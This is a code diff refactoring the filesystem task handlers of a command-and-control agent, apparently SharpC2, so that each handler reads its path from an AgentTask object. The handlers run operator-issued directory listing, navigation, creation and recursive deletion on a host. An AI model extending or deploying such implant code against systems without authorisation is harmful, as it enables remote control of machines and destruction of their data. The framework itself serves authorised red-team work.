@@ -8,7 +8,6 @@ using Shared.Models;
 using System;
 using System.Collections.Generic;
 using System.IO;
-using System.Linq;
 
 namespace Agent.Modules
 {
@@ -59,7 +58,7 @@ namespace Agent.Modules
             };
         }
 
-        void PrintWorkingDirectory(string AgentID, C2Data C2Data)
+        void PrintWorkingDirectory(string AgentID, AgentTask Task)
         {
             try
             {
@@ -72,12 +71,11 @@ namespace Agent.Modules
             }
         }
 
-        void ChangeCurrentDirectory(string AgentID, C2Data C2Data)
+        void ChangeCurrentDirectory(string AgentID, AgentTask Task)
         {
             try
             {
-                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
-                var path = (string)parameters.FirstOrDefault(p => p.Name.Equals("Path", StringComparison.OrdinalIgnoreCase)).Value;
+                var path = (string)Task.Parameters["Path"];
                 Directory.SetCurrentDirectory(path);
 
                 var result = GetCurrentDirectory;
@@ -89,21 +87,20 @@ namespace Agent.Modules
             }
         }
 
-        void ListDirectory(string AgentID, C2Data C2Data)
+        void ListDirectory(string AgentID, AgentTask Task)
         {
             try
             {
-                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
-                var path = (string)parameters.FirstOrDefault(p => p.Name.Equals("Path", StringComparison.OrdinalIgnoreCase)).Value;
+                var path = Task.Parameters["Path"];
                 
-                if (string.IsNullOrEmpty(path))
+                if (path == null)
                 {
                     path = GetCurrentDirectory;
                 }
 
                 var result = new SharpC2ResultList<FileSystemEntryResult>();
 
-                foreach (var directory in Directory.GetDirectories(path))
+                foreach (var directory in Directory.GetDirectories((string)path))
                 {
                     var info = new DirectoryInfo(directory);
                     result.Add(new FileSystemEntryResult
@@ -115,7 +112,7 @@ namespace Agent.Modules
                     });
                 }
 
-                foreach (var file in Directory.GetFiles(path))
+                foreach (var file in Directory.GetFiles((string)path))
                 {
                     var info = new FileInfo(file);
                     result.Add(new FileSystemEntryResult
@@ -135,12 +132,11 @@ namespace Agent.Modules
             }
         }
 
-        void RemoveDirectory(string AgentID, C2Data C2Data)
+        void RemoveDirectory(string AgentID, AgentTask Task)
         {
             try
             {
-                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
-                var directory = (string)parameters.FirstOrDefault(p => p.Name.Equals("Path", StringComparison.OrdinalIgnoreCase)).Value;
+                var directory = (string)Task.Parameters["Path"];
                 Directory.Delete(directory, true);
             }
             catch (Exception e)
@@ -149,13 +145,12 @@ namespace Agent.Modules
             }
         }
 
-        void CreateDirectory(string AgentID, C2Data C2Data)
+        void CreateDirectory(string AgentID, AgentTask Task)
         {
             try
             {
-                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
-                var directory = (string)parameters.FirstOrDefault(p => p.Name.Equals("Path", StringComparison.OrdinalIgnoreCase)).Value;
-                Directory.CreateDirectory(directory);
+                var path = (string)Task.Parameters["Path"];
+                Directory.CreateDirectory(path);
             }
             catch (Exception e)
             {
